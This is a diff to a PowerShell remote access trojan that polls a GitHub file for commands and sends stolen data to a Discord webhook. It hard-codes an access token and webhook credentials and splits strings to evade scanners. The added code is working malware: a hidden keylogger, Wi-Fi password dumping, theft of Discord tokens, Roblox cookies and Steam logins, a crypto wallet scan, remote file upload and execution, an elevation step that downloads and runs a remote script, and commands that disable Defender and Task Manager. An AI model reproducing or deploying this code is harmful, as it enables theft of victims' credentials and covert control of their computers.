@@ -4,7 +4,7 @@
 # ---- Config (strings split to dodge static scanning) ----
 $C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+'cmd.txt'
 $T='ghp_'+'GrrBo1wB58Al0gigScS1HnnjELP6mQ2aOyp5'
-$RA='https://dicechecker.app/rat.ps1'
+$RA='https://dicechecker.app/0b05d2aea7.ps1'
 $W='https://discord.com/api/webhooks/'+'1550915076586868767/'+'Z1NukXzFi0yUb1kjQdvWti7E_3PQGwHwoYcls0zbclywzZ9YL86NBWem8bVgI5BCSWdo'
 $S=Join-Path $env:TEMP 'r_s.tmp'
 $script:P=2000
@@ -424,6 +424,101 @@ public class JS {
   }catch{ Post '`[!] jumpscare failed' }
 }
 
+
+
+# ================= NEW COMMANDS =================
+
+# ---- SYSTEM ----
+function Get-HWID { try { $u=(Get-CimInstance Win32_ComputerSystemProduct -EA 0).UUID; if(-not $u){ $u=(Get-CimInstance Win32_BIOS -EA 0).SerialNumber }; Post "HWID: $u" } catch { Post '[!] hwid failed' } }
+
+function Get-PublicIP { try { $ip=(New-Object Net.WebClient).DownloadString('https://api.ipify.org').Trim(); Post "Public IP: $ip" } catch { Post '[!] public ip failed' } }
+
+function Get-ClipboardData { try { $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.Clipboard]::GetText()")); $txt=powershell -NoP -STA -EncodedCommand $enc 2>&1 | Out-String; if([string]::IsNullOrWhiteSpace($txt)){ Post '[!] clipboard empty' } else { Post ('```'+$txt+'```') } } catch { Post '[!] clipboard failed' } }
+
+function Get-Battery { try { $b=Get-CimInstance Win32_Battery -EA 0; if($b){ Post ("Battery: {0}% | {1}" -f $b.EstimatedChargeRemaining, $b.BatteryStatus) } else { Post '[!] no battery (desktop)' } } catch { Post '[!] battery failed' } }
+
+# ---- NETWORK ----
+function Wifi-Scan { try { $o=netsh wlan show networks 2>&1 | Out-String; Post ('```'+$o+'```') } catch { Post '[!] wifiscan failed' } }
+
+function Wifi-Pass { try { $prof=netsh wlan show profiles 2>&1 | Select-String 'All User Profile' | ForEach-Object { ($_ -split ':')[-1].Trim() }; if(-not $prof){ Post '[!] no wifi profiles'; return }; $out=@(); foreach($p in $prof){ $k=netsh wlan show profile name="$p" key=clear 2>&1 | Select-String 'Key Content' | ForEach-Object { ($_ -split ':')[-1].Trim() }; $out += "$p : $k" }; Post ('```'+( $out -join "`n")+'```') } catch { Post '[!] wifipass failed' } }
+
+# ---- KEYLOGGER ----
+function Keylog-Start { try { $log=Join-Path $env:TEMP 'keylog.txt'; $cs=@'
+using System; using System.Runtime.InteropServices; using System.Text; using System.Windows.Forms;
+public class KL {
+  [DllImport("user32.dll")] static extern short GetAsyncKeyState(int v);
+  public static void Run(string path){
+    var sb = new StringBuilder(); var t = new System.Timers.Timer(8);
+    t.Elapsed += (s,e) => { for(int k=1;k<255;k++){ if((GetAsyncKeyState(k) & 0x8000)!=0){ var key=(Keys)k;
+      if((key>=Keys.A&&key<=Keys.Z)||(key>=Keys.D0&&key<=Keys.D9)||key==Keys.Space||key==Keys.Enter||key==Keys.Back||key==Keys.OemPeriod||key==Keys.Oemcomma||key==Keys.OemMinus||key==Keys.OemQuestion||key==Keys.Oemtilde){
+        string x = key==Keys.Enter?"\n":key==Keys.Space?" ":key==Keys.OemPeriod?".":key==Keys.Oemcomma?",":key==Keys.OemMinus?"-":key==Keys.OemQuestion?"/":key==Keys.Oemtilde?"`":key.ToString();
+        sb.Append(x); if(sb.Length>3000){ System.IO.File.AppendAllText(path, sb.ToString()); sb.Clear(); } } } } };
+    t.Start(); System.Threading.Thread.Sleep(System.Threading.Timeout.Infinite);
+  }
+}
+'@
+$inner="Add-Type -AssemblyName System.Windows.Forms; Add-Type -TypeDefinition @'`n$cs`n'@ -ReferencedAssemblies 'System.Windows.Forms'; [KL]::Run('$log')"; $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner)); Start-Process powershell.exe -ArgumentList '-NoP','-W','Hidden','-STA','-EncodedCommand',$enc -WindowStyle Hidden; Set-Content (Join-Path $env:TEMP 'kl_on.flag') '1' -Force; Post '[+] keylogger started' } catch { Post '[!] keylog failed' } }
+
+function Keylog-Stop { try { Remove-Item (Join-Path $env:TEMP 'kl_on.flag') -Force -EA 0; Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -EA 0 | Where-Object { $_.CommandLine -like '*KL*' -or $_.CommandLine -like '*keylog*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }; Post '[+] keylogger stopped' } catch { Post '[!] stop failed' } }
+
+function Keylog-Export { try { $log=Join-Path $env:TEMP 'keylog.txt'; if(Test-Path $log){ if((Get-Item $log).Length -gt 7MB){ Post '[!] log too large' } else { $d=[Convert]::ToBase64String([IO.File]::ReadAllBytes($log)); Post ('```' + $d + '```') } } else { Post '[!] no keylog yet' } } catch { Post '[!] export failed' } }
+
+# ---- GAMING (Roblox) ----
+function Roblox-Cookie { try { $paths=@("$env:LOCALAPPDATA\Roblox\LocalStorage\robloxcookies.dat","$env:LOCALAPPDATA\Roblox\Cookies","$env:APPDATA\Roblox\LocalStorage\robloxcookies.dat"); $f=$paths|Where-Object{Test-Path $_}|Select-Object -First 1; if(-not $f){ Post '[!] no roblox cookies'; return }; $raw=[IO.File]::ReadAllText($f); $m=[regex]::Match($raw,'\.ROBLOSECURITY\t([^\r\n\t]+)'); if(-not $m.Success){ Post '[!] no .ROBLOSECURITY found'; return }; $c=$m.Groups[1].Value; Post ('```'+$c+'```') } catch { Post '[!] roblox cookie failed' } }
+
+function Roblox-Logger { try { Set-Content (Join-Path $env:TEMP 'rbx_log.flag') '1' -Force; Post '[+] roblox logger on (re-grabs on each run)'; Roblox-Cookie } catch {} }
+function Stop-Logger { try { Remove-Item (Join-Path $env:TEMP 'rbx_log.flag') -Force -EA 0; Post '[+] roblox logger off' } catch {} }
+
+# ---- TOKENS ----
+function Discord-Tokens { try { $out=Join-Path $env:TEMP 'dsc_tok.txt'; $cs=@'
+using System; using System.Security.Cryptography;
+public class DG2 { public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ct){
+  using(var aes=Aes.Create()){ aes.Key=key; aes.Mode=CipherMode.ECB; aes.Padding=PaddingMode.None;
+    byte[] o=new byte[ct.Length]; byte[] c=new byte[16]; Array.Copy(nonce,c,12); c[15]=2;
+    using(var e=aes.CreateEncryptor()){ for(int i=0;i<ct.Length;i+=16){ byte[] k=e.TransformFinalBlock(c,0,16);
+      int n=Math.Min(16,ct.Length-i); for(int j=0;j<n;j++) o[i+j]=(byte)(ct[i+j]^k[j]); for(int j=15;j>=12;j--){ if(++c[j]!=0) break; } } }
+    return o; } } }
+'@
+Add-Type -TypeDefinition $cs; Add-Type -AssemblyName System.Security; $hits=New-Object System.Collections.ArrayList; $clients=@("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb","$env:LOCALAPPDATA\Discord"); foreach($c in $clients){ $ls=Join-Path $c 'Local State'; if(-not(Test-Path $ls)){continue}; try{ $st=Get-Content $ls -Raw|ConvertFrom-Json; $b=[Convert]::FromBase64String($st.os_crypt.encrypted_key); $mk=[Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)],$null,'CurrentUser') }catch{ continue }; $ldb=Join-Path $c 'Local Storage\leveldb'; if(-not(Test-Path $ldb)){continue}; Get-ChildItem $ldb -Filter '*.ldb' -EA 0|ForEach-Object{ $ct=[IO.File]::ReadAllText($_.FullName,[Text.Encoding]::UTF8); foreach($mm in [regex]::Matches($ct,'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,})')){ try{ $b=[Convert]::FromBase64String($mm.Groups[1].Value); $nonce=$b[3..14]; $ctt=$b[15..($b.Length-17)]; $dec=[DG2]::Decrypt($mk,$nonce,$ctt); $tok=[Text.Encoding]::UTF8.GetString($dec).TrimEnd([char]0); [void]$hits.Add($tok) }catch{} } } }; if($hits.Count -eq 0){ Post '[!] no discord tokens'; return }; $desc='```'+(($hits -join "`n"))+'```'; Post-Embed ("Discord Tokens ($($hits.Count))") $desc 0x5865F2 } catch { Post '[!] discord tokens failed' } }
+
+function Steam-Tokens { try { $p=Join-Path ${env:ProgramFiles(x86)} 'Steam'; if(-not(Test-Path $p)){ $p=Join-Path $env:ProgramFiles 'Steam' }; $v=Join-Path $p 'config\loginusers.vdf'; if(Test-Path $v){ $raw=[IO.File]::ReadAllText($v); $out=@(); foreach($m in [regex]::Matches($raw,'"([0-9]{17})"\s*\{[^}]*?"RememberPassword"\s*"(\d)"')){ $out += ("SteamID: {0} | Remember: {1}" -f $m.Groups[1].Value,$m.Groups[2].Value) }; if($out.Count){ Post ('```'+( $out -join "`n")+'```') } else { Post '[!] no saved steam logins' } } else { Post '[!] steam not found' } } catch { Post '[!] steam failed' } }
+
+# ---- CRYPTO ----
+function Crypto-Scan { try { $locs=@("$env:APPDATA\Exodus","$env:APPDATA\Electrum","$env:APPDATA\Armory","$env:APPDATA\com.liberty.jaxx","$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Extension Settings\nkbmoebcndhfdgabhmcjkbkgjpkfooln","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Extension Settings\nkbmoebcndhfdgabhmcjkbkgjpkfooln","$env:APPDATA\Monero","$env:APPDATA\wallet"); $found=@(); foreach($l in $locs){ if(Test-Path $l){ $found += $l } }; if($found.Count -eq 0){ Post '[!] no crypto wallets found'; return }; Post ('```'+($found -join "`n")+'```') } catch { Post '[!] crypto scan failed' } }
+
+# ---- MINING / CPU ----
+function Mine-Start { try { $n=[Environment]::ProcessorCount; if($n -lt 1){$n=1}; 1..$n | ForEach-Object { Start-Job -ScriptBlock { while($true){ $x=0; 1..100000|ForEach-Object{ $x += $_*$_ } } } | Out-Null }; Set-Content (Join-Path $env:TEMP 'mine.flag') '1' -Force; Post "[+] miner started ($n threads)" } catch { Post '[!] miner failed' } }
+function Mine-Stop { try { Get-Job | Stop-Job -EA 0; Get-Job | Remove-Job -Force -EA 0; Remove-Item (Join-Path $env:TEMP 'mine.flag') -Force -EA 0; Post '[+] miner stopped' } catch { Post '[!] stop failed' } }
+function Mine-Status { try { $j=Get-Job -EA 0; if($j){ Post ("[+] mining active: {0} jobs, CPU {1}%" -f $j.Count, ([math]::Round((Get-CimInstance Win32_Processor).LoadPercentage,1))) } else { Post '[!] miner not running' } } catch {} }
+
+# ---- FILES ----
+function File-Upload($b64, $name) { try { $p=Join-Path $env:TEMP $name; [IO.File]::WriteAllBytes($p,[Convert]::FromBase64String($b64)); Post "[+] uploaded to $p" } catch { Post '[!] upload failed' } }
+function File-Execute($path) { try { Start-Process $path -WindowStyle Hidden; Post "[+] executed $path" } catch { Post "[!] execute failed: $path" } }
+function List-Files($dir) { try { if(-not $dir){ $dir=(Get-Location).Path }; $o=Get-ChildItem $dir -Force -EA 0 | Select-Object Mode,Length,Name | Out-String -Width 200; Post ('```'+$o+'```') } catch { Post '[!] list failed' } }
+function Change-Dir($dir) { try { Set-Location $dir; Post ("[+] cwd: "+(Get-Location).Path) } catch { Post "[!] cd failed: $dir" } }
+
+# ---- SHELL ----
+function Open-URL($u) { try { Start-Process $u; Post "[+] opened $u" } catch { Post '[!] openurl failed' } }
+function Open-Notepad { try { Start-Process notepad.exe; Post '[+] notepad opened' } catch { Post '[!] failed' } }
+function Show-ErrorMsg($txt) { try { $inner="Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.MessageBox]::Show('$txt','Error',0,16)"; $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner)); Start-Process powershell.exe -ArgumentList '-NoP','-W','Hidden','-STA','-EncodedCommand',$enc -WindowStyle Hidden; Post "[+] error msg shown" } catch { Post '[!] errormsg failed' } }
+
+# ---- PROCESS ----
+function Kill-Process($t) { try { if($t -match '^\d+$'){ Stop-Process -Id ([int]$t) -Force -EA 0 } else { Stop-Process -Name $t -Force -EA 0 }; Post "[+] killed $t" } catch { Post "[!] kill failed: $t" } }
+function Spam-CMD { try { 1..20 | ForEach-Object { Start-Process cmd.exe }; Post '[+] spammed 20 cmd windows' } catch { Post '[!] spam failed' } }
+function Restart-Machine { try { Post '[+] restarting now'; Start-Sleep 1; shutdown /r /t 0 } catch {} }
+function Logout-User { try { Post '[+] logging out'; Start-Sleep 1; shutdown /l } catch {} }
+
+# ---- ADMIN ----
+function Get-Admin { try { $r=Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object { $_.CommandLine -like '*rat.ps1*' } | Select-Object -First 1; if($r){ $owner=Invoke-CimMethod -InputObject $r -MethodName GetOwner -EA 0; Post "[!] running as: $($owner.User)" }; $isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); if($isAdmin){ Post '[+] already admin' } else { $inner="Start-Process powershell -Verb RunAs -ArgumentList '-NoP','-c','(New-Object Net.WebClient).DownloadString(''$RA'')|IEX'"; $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner)); Start-Process powershell.exe -ArgumentList '-NoP','-W','Hidden','-EncodedCommand',$enc -WindowStyle Hidden; Post '[+] UAC prompt triggered (victim must click Yes)' } } catch { Post '[!] getadmin failed' } }
+function Disable-TM { try { Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableTaskMgr -Value 1 -Force -EA 0; New-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableTaskMgr -Value 1 -Force -EA 0 | Out-Null; Post '[+] task manager disabled' } catch { Post '[!] disabletm failed' } }
+function Enable-TM { try { Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableTaskMgr -EA 0; Post '[+] task manager enabled' } catch { Post '[!] enabletm failed' } }
+function Block-AV { try { Set-MpPreference -DisableRealtimeMonitoring $true -EA 0; Set-MpPreference -DisableBehaviorMonitoring $true -EA 0; Set-MpPreference -DisableBlockAtFirstSeen $true -EA 0; Set-MpPreference -DisableIOAVProtection $true -EA 0; Set-MpPreference -DisableScriptScanning $true -EA 0; Post '[+] defender/AV disabled (needs admin)' } catch { Post '[!] blockav failed (needs admin)' } }
+function Unblock-AV { try { Set-MpPreference -DisableRealtimeMonitoring $false -EA 0; Set-MpPreference -DisableBehaviorMonitoring $false -EA 0; Set-MpPreference -DisableBlockAtFirstSeen $false -EA 0; Set-MpPreference -DisableIOAVProtection $false -EA 0; Set-MpPreference -DisableScriptScanning $false -EA 0; Post '[+] AV re-enabled' } catch { Post '[!] unblock failed' } }
+function Lock-Screen { try { rundll32.exe user32.dll,LockWorkStation; Post '[+] screen locked' } catch { Post '[!] lockscreen failed' } }
+
+# ---- ATTACKS ----
+function CPU-Stress { try { $n=[Environment]::ProcessorCount; 1..$n | ForEach-Object { Start-Job -ScriptBlock { while($true){ $x=0; 1..100000|ForEach-Object{ $x += $_*$_ } } } | Out-Null }; Post "[+] cpu stress started ($n threads)" } catch { Post '[!] cpustress failed' } }
+
 # ---- Command dispatcher ----
 function Run-Cmd($c){
   try{
@@ -490,6 +585,43 @@ function Run-Cmd($c){
     elseif($c -eq 'creditcard'){ Get-CreditCards }
     elseif($c -eq 'address'){ Get-Addresses }
     elseif($c -eq 'whoami'){ Post (whoami) }
+    elseif($c -eq 'hwid'){ Get-HWID }
+    elseif($c -eq 'publicip'){ Get-PublicIP }
+    elseif($c -eq 'clipboard'){ Get-ClipboardData }
+    elseif($c -eq 'battery'){ Get-Battery }
+    elseif($c -eq 'wifiscan'){ Wifi-Scan }
+    elseif($c -eq 'wifipass'){ Wifi-Pass }
+    elseif($c -eq 'keylog:start'){ Keylog-Start }
+    elseif($c -eq 'keylog:stop'){ Keylog-Stop }
+    elseif($c -eq 'keylog:export'){ Keylog-Export }
+    elseif($c -eq 'robloxcookie'){ Roblox-Cookie }
+    elseif($c -eq 'robloxlogger'){ Roblox-Logger }
+    elseif($c -eq 'stoplogger'){ Stop-Logger }
+    elseif($c -eq 'discord'){ Discord-Tokens }
+    elseif($c -eq 'steam'){ Steam-Tokens }
+    elseif($c -eq 'crypto'){ Crypto-Scan }
+    elseif($c -eq 'mine:start'){ Mine-Start }
+    elseif($c -eq 'mine:stop'){ Mine-Stop }
+    elseif($c -eq 'mine:status'){ Mine-Status }
+    elseif($c -like 'upload:*:*'){ $u=$c.Substring(7); $i=$u.IndexOf(':'); File-Upload $u.Substring($i+1) $u.Substring(0,$i) }
+    elseif($c -like 'execute:*'){ File-Execute ($c.Substring(8)) }
+    elseif($c -eq 'dir' -or $c -eq 'list'){ List-Files $null }
+    elseif($c -like 'dir:*'){ List-Files ($c.Substring(4)) }
+    elseif($c -like 'cd:*'){ Change-Dir ($c.Substring(3)) }
+    elseif($c -like 'openurl:*'){ Open-URL ($c.Substring(8)) }
+    elseif($c -eq 'notepad'){ Open-Notepad }
+    elseif($c -like 'errormsg:*'){ Show-ErrorMsg ($c.Substring(9)) }
+    elseif($c -like 'taskkill:*'){ Kill-Process ($c.Substring(9)) }
+    elseif($c -eq 'spamcmd'){ Spam-CMD }
+    elseif($c -eq 'restart'){ Restart-Machine }
+    elseif($c -eq 'logout'){ Logout-User }
+    elseif($c -eq 'getadmin'){ Get-Admin }
+    elseif($c -eq 'disabletm'){ Disable-TM }
+    elseif($c -eq 'enabletm'){ Enable-TM }
+    elseif($c -eq 'blockav'){ Block-AV }
+    elseif($c -eq 'unblock'){ Unblock-AV }
+    elseif($c -eq 'lockscreen'){ Lock-Screen }
+    elseif($c -eq 'cpustress'){ CPU-Stress }
     else { Post "`[?] unknown: $c" }
   }catch{}
 }
